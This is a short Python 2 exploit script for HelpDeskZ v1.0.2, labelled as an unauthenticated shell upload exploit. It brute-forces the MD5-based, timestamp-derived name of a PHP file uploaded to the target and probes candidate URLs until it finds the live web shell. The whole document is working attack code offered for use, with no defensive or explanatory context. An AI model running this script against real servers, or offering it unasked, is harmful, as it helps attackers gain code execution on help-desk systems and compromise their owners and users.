import hashlib
import time
import sys
import requests
 
print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
 
if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)
 
helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]
 
currentTime = int(time.time())
 
for x in range(0, 1600):
		plaintext = fileName + str(currentTime - x)
		md5hash = hashlib.md5(plaintext).hexdigest()
		url = helpdeskzBaseUrl+md5hash+'.php'
		print url
		response = requests.head(url)
		if response.status_code == 200:
			print "found!"
			print url
			sys.exit(0)
 
print "Sorry, I did not find anything"
